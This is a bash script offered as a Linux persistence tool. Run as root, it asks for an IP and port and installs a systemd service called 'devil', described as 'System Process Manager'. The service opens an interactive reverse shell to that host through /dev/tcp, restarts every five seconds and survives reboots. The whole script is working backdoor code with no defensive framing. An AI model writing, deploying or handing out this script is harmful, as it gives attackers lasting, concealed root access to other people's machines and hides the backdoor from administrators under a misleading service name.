#!/bin/bash

GREEN="\e[1;32m"
WHITE="\e[1;37m"
RED="\e[1;31m"
RESET="\e[0m"

name="System Process Manager"
filename="devil"
service_path="/etc/systemd/system/$filename.service"

echo -e "${WHITE}"
echo "╔══════════════════════════════╗"
echo "║   LINUX SYSTEMD PERSISTENCE  ║"
echo "╚══════════════════════════════╝"
echo -e "${RESET}"


validate_ip() {
    local ip="$1"
    if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        for octet in $(echo "$ip" | tr "." " "); do
            if ((octet < 0 || octet > 255)); then
                return 1
            fi
        done
        return 0
    fi
    return 1
}

validate_port() {
    local port="$1"
    if [[ $port =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535)); then
        return 0
    fi
    return 1
}

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[-] This script must be run as root!${RESET}"
    exit 1
fi

read -p "$(echo -e ${WHITE}"[?] Enter IP: "${RESET})" ip
if ! validate_ip "$ip"; then
    echo -e "${RED}[-] Invalid IP address!${RESET}"
    exit 1
fi

read -p "$(echo -e ${WHITE}"[?] Enter PORT: "${RESET})" port
if ! validate_port "$port"; then
    echo -e "${RED}[-] Invalid port number!${RESET}"
    exit 1
fi

echo -ne "${GREEN}[+] Installing persistence"; sleep 0.5; echo -ne "."; sleep 0.5; echo -ne "."; sleep 0.5; echo -e ".${RESET}"
sleep 1

cat <<EOF > "$service_path"
[Unit]
Description=$name
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/root
ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'
Restart=always
RestartSec=5
Environment="HOME=/root"

[Install]
WantedBy=multi-user.target
EOF

chmod 644 "$service_path"
systemctl daemon-reload
systemctl enable --now "$filename.service"

echo -e "${GREEN}[✔] Persistence installed successfully as $filename.service${RESET}"
sleep 0.5
echo -e "${GREEN}[✔] Reverse shell will trigger every 5 seconds, even after a reboot.${RESET}"
